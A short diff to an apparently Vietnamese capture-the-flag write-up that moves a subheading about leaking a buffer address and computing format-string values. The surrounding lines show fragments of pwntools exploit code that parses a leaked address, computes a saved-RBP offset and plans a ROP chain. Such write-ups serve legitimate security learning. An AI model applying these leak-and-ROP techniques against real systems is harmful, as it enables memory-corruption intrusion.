@@ -18,6 +18,7 @@
   - Ở đây tôi chỉ ghi 2 địa chỉ do đó các ROP sẽ bắt đầu ghi từ (buf + 192) -> saverbp mới là (buf + 184) -> ghi được 8 stack, khá ít nhưng thế cũng là đủ
 
 **3. Exploit**
+  - **leak địa chỉ buf và tính cách giá trị cho fmt**
   ```
   r.recvuntil(b'at ')
 out = r.recv(14)
@@ -40,7 +41,7 @@ s_newsaverbp = str(hex(new_saverbp))
 off_set = int('0x' + s_newsaverbp[12:14], 16)
 print(off_set)
   ```
-  - **leak địa chỉ buf và tính cách giá trị cho fmt**
+  
   ```
   if off_set - 9 < 0:
     r.close()
